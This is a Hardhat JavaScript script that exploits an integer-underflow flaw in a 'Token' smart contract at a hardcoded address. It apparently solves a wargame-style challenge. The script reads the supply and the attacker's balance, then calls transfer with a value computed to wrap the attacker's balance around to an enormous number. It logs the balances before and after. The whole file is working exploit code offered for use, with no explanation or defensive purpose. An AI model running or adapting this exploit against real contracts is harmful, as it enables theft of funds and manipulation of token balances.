// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 👉 Contract name and address
  const contractName = "Token";
  const contractAddress = "0x9CD82b2c39C36524650800169b8172029C47dBC0";

  // 📗 We get the contract to be hacked
  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 🔨 Get accounts
  const [hackerSigner, hackerSigner2] = await hre.ethers.getSigners();
  console.log(`🤓 Hacker address:\n ${hackerSigner.address} \n`);

  // 🗣 Get token total supply
  let supply = await contract.totalSupply();
  // supply = hre.ethers.BigNumber.from(supply);
  console.log(`💰 HackContract supply:\n ${supply} \n`);

  // 🗣 Get hacker balance
  let hackerBalanceBeforeAttack = await contract.balanceOf(
    hackerSigner.address
  );
  hackerBalanceBeforeAttack = hre.ethers.BigNumber.from(
    hackerBalanceBeforeAttack.toString()
  );
  console.log(`💰 Hacker balance:\n ${hackerBalanceBeforeAttack} \n`);

  // 👿 Hacking the contract
  const MAX_UINT_256 = ethers.BigNumber.from(2).pow(256).sub(1);
  const hackValue = ethers.BigNumber.from(hackerBalanceBeforeAttack)
    .add(1)
    .add(MAX_UINT_256)
    .sub(supply);

  console.log(`👿 Hack value:\n ${hackValue.toString()} \n`);
  const transferHackTx = await contract
    .connect(hackerSigner)
    .transfer(hackerSigner2.address, hackValue);
  await transferHackTx.wait((confirms = 1));

  // 🗣 Hacker balance
  let hackerBalanceAfterAttack = await contract.balanceOf(hackerSigner.address);
  hackerBalanceAfterAttack = hre.ethers.BigNumber.from(
    hackerBalanceAfterAttack.toString()
  );
  console.log(`💰 Hacker balance:\n ${hackerBalanceAfterAttack} \n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
